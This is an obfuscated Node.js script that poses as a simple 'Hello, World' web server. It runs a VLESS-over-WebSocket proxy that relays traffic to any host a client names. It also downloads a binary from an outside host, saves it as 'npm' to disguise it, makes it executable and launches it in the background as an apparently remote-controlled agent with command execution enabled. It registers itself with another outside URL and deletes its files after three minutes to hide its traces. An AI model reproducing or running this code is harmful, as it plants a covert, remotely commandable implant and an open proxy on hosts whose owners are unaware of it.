const _0x3fdc83=_0x54d1;(function(_0x235046,_0x5277b9){const _0x1ff105=_0x54d1,_0x1227ed=_0x235046();while(!![]){try{const _0x281f46=-parseInt(_0x1ff105(0x181))/0x1+parseInt(_0x1ff105(0x15a))/0x2*(-parseInt(_0x1ff105(0x16f))/0x3)+-parseInt(_0x1ff105(0x183))/0x4+parseInt(_0x1ff105(0x17e))/0x5*(parseInt(_0x1ff105(0x1a6))/0x6)+parseInt(_0x1ff105(0x173))/0x7*(-parseInt(_0x1ff105(0x177))/0x8)+parseInt(_0x1ff105(0x1a4))/0x9+parseInt(_0x1ff105(0x16e))/0xa*(parseInt(_0x1ff105(0x142))/0xb);if(_0x281f46===_0x5277b9)break;else _0x1227ed['push'](_0x1227ed['shift']());}catch(_0x74fc25){_0x1227ed['push'](_0x1227ed['shift']());}}}(_0x3a9a,0x6281d));const os=require('os'),http=require(_0x3fdc83(0x169)),fs=require('fs'),axios=require('axios'),net=require(_0x3fdc83(0x190)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x3fdc83(0x154)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3fdc83(0x192)][_0x3fdc83(0x188)]||_0x3fdc83(0x1a3),NEZHA_SERVER=process['env'][_0x3fdc83(0x161)]||'',NEZHA_PORT=process[_0x3fdc83(0x192)][_0x3fdc83(0x164)]||'',NEZHA_KEY=process[_0x3fdc83(0x192)][_0x3fdc83(0x19c)]||'',DOMAIN=process[_0x3fdc83(0x192)][_0x3fdc83(0x1a8)]||_0x3fdc83(0x175),AUTO_ACCESS=process[_0x3fdc83(0x192)][_0x3fdc83(0x16d)]||![],WSPATH=process[_0x3fdc83(0x192)][_0x3fdc83(0x15b)]||UUID[_0x3fdc83(0x193)](0x0,0x8),SUB_PATH=process[_0x3fdc83(0x192)][_0x3fdc83(0x185)]||'sub',NAME=process[_0x3fdc83(0x192)][_0x3fdc83(0x152)]||_0x3fdc83(0x172),PORT=process[_0x3fdc83(0x192)]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x53f12d=_0x3fdc83;try{const _0x52fd64=await axios[_0x53f12d(0x182)]('https://speed.cloudflare.com/meta'),_0x178371=_0x52fd64['data'];ISP=(_0x178371[_0x53f12d(0x171)]+'-'+_0x178371[_0x53f12d(0x155)])[_0x53f12d(0x196)](/ /g,'_');}catch(_0x5a017b){ISP=_0x53f12d(0x14e);}};function _0x54d1(_0x1580fb,_0x1e8687){const _0x3a9a1e=_0x3a9a();return _0x54d1=function(_0x54d1df,_0x2f4b48){_0x54d1df=_0x54d1df-0x141;let _0x505c73=_0x3a9a1e[_0x54d1df];return _0x505c73;},_0x54d1(_0x1580fb,_0x1e8687);}GetISP();const httpServer=http[_0x3fdc83(0x17f)]((_0x3e4757,_0x440b14)=>{const _0x2bb870=_0x3fdc83;if(_0x3e4757[_0x2bb870(0x16a)]==='/')_0x440b14[_0x2bb870(0x153)](0xc8,{'Content-Type':_0x2bb870(0x143)}),_0x440b14[_0x2bb870(0x156)](_0x2bb870(0x150));else{if(_0x3e4757[_0x2bb870(0x16a)]==='/'+SUB_PATH){const _0x29202c='vless://'+UUID+_0x2bb870(0x170)+DOMAIN+_0x2bb870(0x166)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x51d508=Buffer[_0x2bb870(0x162)](_0x29202c)['toString'](_0x2bb870(0x191));_0x440b14[_0x2bb870(0x153)](0xc8,{'Content-Type':_0x2bb870(0x143)}),_0x440b14[_0x2bb870(0x156)](_0x51d508+'\x0a');}else _0x440b14[_0x2bb870(0x153)](0x194,{'Content-Type':'text/plain'}),_0x440b14['end'](_0x2bb870(0x199));}}),wss=new WebSocket[(_0x3fdc83(0x1aa))]({'server':httpServer}),uuid=UUID[_0x3fdc83(0x196)](/-/g,'');wss['on'](_0x3fdc83(0x14c),_0x4c652f=>{const _0x534cce=_0x3fdc83;_0x4c652f[_0x534cce(0x195)](_0x534cce(0x18f),_0x3a2933=>{const _0x54a450=_0x534cce,[_0x37254b]=_0x3a2933,_0x334cea=_0x3a2933[_0x54a450(0x193)](0x1,0x11);if(!_0x334cea[_0x54a450(0x160)]((_0x47ded3,_0x2a61c9)=>_0x47ded3==parseInt(uuid[_0x54a450(0x176)](_0x2a61c9*0x2,0x2),0x10)))return;let _0x149900=_0x3a2933[_0x54a450(0x193)](0x11,0x12)['readUInt8']()+0x13;const _0x4e99eb=_0x3a2933[_0x54a450(0x193)](_0x149900,_0x149900+=0x2)[_0x54a450(0x17c)](0x0),_0xabb9b0=_0x3a2933[_0x54a450(0x193)](_0x149900,_0x149900+=0x1)[_0x54a450(0x157)](),_0x484996=_0xabb9b0==0x1?_0x3a2933[_0x54a450(0x193)](_0x149900,_0x149900+=0x4)[_0x54a450(0x194)]('.'):_0xabb9b0==0x2?new TextDecoder()[_0x54a450(0x197)](_0x3a2933[_0x54a450(0x193)](_0x149900+0x1,_0x149900+=0x1+_0x3a2933[_0x54a450(0x193)](_0x149900,_0x149900+0x1)[_0x54a450(0x157)]())):_0xabb9b0==0x3?_0x3a2933['slice'](_0x149900,_0x149900+=0x10)['reduce']((_0x44b709,_0x33703b,_0x3daf9a,_0x3d2db3)=>_0x3daf9a%0x2?_0x44b709[_0x54a450(0x14b)](_0x3d2db3[_0x54a450(0x193)](_0x3daf9a-0x1,_0x3daf9a+0x1)):_0x44b709,[])['map'](_0x590528=>_0x590528[_0x54a450(0x17c)](0x0)[_0x54a450(0x18b)](0x10))[_0x54a450(0x194)](':'):'';_0x4c652f[_0x54a450(0x19e)](new Uint8Array([_0x37254b,0x0]));const _0x394d75=createWebSocketStream(_0x4c652f);net[_0x54a450(0x17d)]({'host':_0x484996,'port':_0x4e99eb},function(){const _0x17f1b3=_0x54a450;this[_0x17f1b3(0x1a2)](_0x3a2933[_0x17f1b3(0x193)](_0x149900)),_0x394d75['on'](_0x17f1b3(0x1a9),()=>{})[_0x17f1b3(0x186)](this)['on'](_0x17f1b3(0x1a9),()=>{})[_0x17f1b3(0x186)](_0x394d75);})['on'](_0x54a450(0x1a9),()=>{});})['on'](_0x534cce(0x1a9),()=>{});});const getDownloadUrl=()=>{const _0xc5c0c5=_0x3fdc83,_0x3fa55b=os[_0xc5c0c5(0x17b)]();return _0x3fa55b===_0xc5c0c5(0x15f)||_0x3fa55b==='arm64'||_0x3fa55b===_0xc5c0c5(0x1a1)?!NEZHA_PORT?_0xc5c0c5(0x180):_0xc5c0c5(0x145):!NEZHA_PORT?_0xc5c0c5(0x14a):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x47cf30=_0x3fdc83;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x32bacd=getDownloadUrl(),_0x5e0e46=await axios({'method':_0x47cf30(0x182),'url':_0x32bacd,'responseType':_0x47cf30(0x149)}),_0x370206=fs['createWriteStream']('npm');return _0x5e0e46[_0x47cf30(0x187)][_0x47cf30(0x186)](_0x370206),new Promise((_0x98cde,_0x322c4d)=>{const _0x11faf3=_0x47cf30;_0x370206['on'](_0x11faf3(0x17a),()=>{const _0x253cbe=_0x11faf3;console[_0x253cbe(0x146)]('npm\x20download\x20successfully'),exec(_0x253cbe(0x18e),_0xebf165=>{if(_0xebf165)_0x322c4d(_0xebf165);_0x98cde();});}),_0x370206['on'](_0x11faf3(0x1a9),_0x322c4d);});}catch(_0xeb3169){throw _0xeb3169;}},runnz=async()=>{const _0x54fdf4=_0x3fdc83;try{const _0x21cb87=execSync(_0x54fdf4(0x15d),{'encoding':_0x54fdf4(0x147)});if(_0x21cb87[_0x54fdf4(0x179)]()!==''){console[_0x54fdf4(0x146)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x1f34bc){}await downloadFile();let _0x5f41ae='',_0x36c781=[_0x54fdf4(0x19b),_0x54fdf4(0x1a5),_0x54fdf4(0x18d),_0x54fdf4(0x189),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x36159e=_0x36c781[_0x54fdf4(0x144)](NEZHA_PORT)?_0x54fdf4(0x15c):'';_0x5f41ae=_0x54fdf4(0x151)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x36159e+_0x54fdf4(0x18c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2b9fc9=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x54fdf4(0x165)](':')[_0x54fdf4(0x163)]():'',_0x4f6c31=_0x36c781[_0x54fdf4(0x144)](_0x2b9fc9)?_0x54fdf4(0x178):_0x54fdf4(0x1a0),_0x46d7ec=_0x54fdf4(0x14d)+NEZHA_KEY+_0x54fdf4(0x16b)+NEZHA_SERVER+_0x54fdf4(0x19a)+_0x4f6c31+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x54fdf4(0x198)]('config.yaml',_0x46d7ec);}_0x5f41ae=_0x54fdf4(0x167);}else{console[_0x54fdf4(0x146)](_0x54fdf4(0x174));return;}}try{exec(_0x5f41ae,{'shell':_0x54fdf4(0x141)},_0x25cdde=>{const _0x293f22=_0x54fdf4;if(_0x25cdde)console[_0x293f22(0x1a9)](_0x293f22(0x19d),_0x25cdde);else console[_0x293f22(0x146)](_0x293f22(0x15e));});}catch(_0x1611c2){console[_0x54fdf4(0x1a9)](_0x54fdf4(0x18a)+_0x1611c2);}};async function addAccessTask(){const _0x348d0f=_0x3fdc83;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5b4b70=_0x348d0f(0x158)+DOMAIN+'/'+SUB_PATH;try{const _0x200a28=await axios[_0x348d0f(0x19f)](_0x348d0f(0x1a7),{'url':_0x5b4b70},{'headers':{'Content-Type':_0x348d0f(0x14f)}});console['log'](_0x348d0f(0x16c));}catch(_0x1ee7fa){}}const delFiles=()=>{const _0x5f0d7f=_0x3fdc83;fs[_0x5f0d7f(0x184)]('npm',()=>{}),fs[_0x5f0d7f(0x184)](_0x5f0d7f(0x159),()=>{});};httpServer[_0x3fdc83(0x148)](PORT,()=>{const _0x7758b=_0x3fdc83;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x7758b(0x146)](_0x7758b(0x168)+PORT);});function _0x3a9a(){const _0x1e014b=['10934170GrvNik','186DtcwWy','@www.visa.com.tw:443?encryption=none&security=tls&sni=','country','Vls','3325wskHDW','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','ugbyuijol.g1-us-east.galaxycloud.app','substr','7736nKiUrf','true','trim','finish','arch','readUInt16BE','connect','533145tklBeT','createServer','https://arm64.ssss.nyc.mn/v1','373974TkbbHf','get','2458312QnhTfx','unlink','SUB_PATH','pipe','data','UUID','2087','error:\x20','toString','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2096','chmod\x20+x\x20npm','message','net','base64','env','slice','join','once','replace','decode','writeFileSync','Not\x20Found\x0a','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','443','NEZHA_KEY','npm\x20running\x20error:','send','post','false','aarch64','write','0a198d14-b880-4ce4-ac19-b207d0a1c5a4','3681576fbrYzb','8443','30LoNOqa','https://oooo.serv00.net/add-url','DOMAIN','error','Server','/bin/bash','11TShTEM','text/plain','includes','https://arm64.ssss.nyc.mn/agent','log','utf-8','listen','stream','https://amd64.ssss.nyc.mn/v1','concat','connection','client_secret:\x20','Unknown','application/json','Hello,\x20World\x0a','setsid\x20nohup\x20./npm\x20-s\x20','NAME','writeHead','child_process','asOrganization','end','readUInt8','https://','config.yaml','5944JLSzjp','WSPATH','--tls','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','npm\x20is\x20running','arm','every','NEZHA_SERVER','from','pop','NEZHA_PORT','split','&fp=chrome&type=ws&host=','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Server\x20is\x20running\x20on\x20port\x20','http','url','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','Automatic\x20Access\x20Task\x20added\x20successfully','AUTO_ACCESS'];_0x3a9a=function(){return _0x1e014b;};return _0x3a9a();}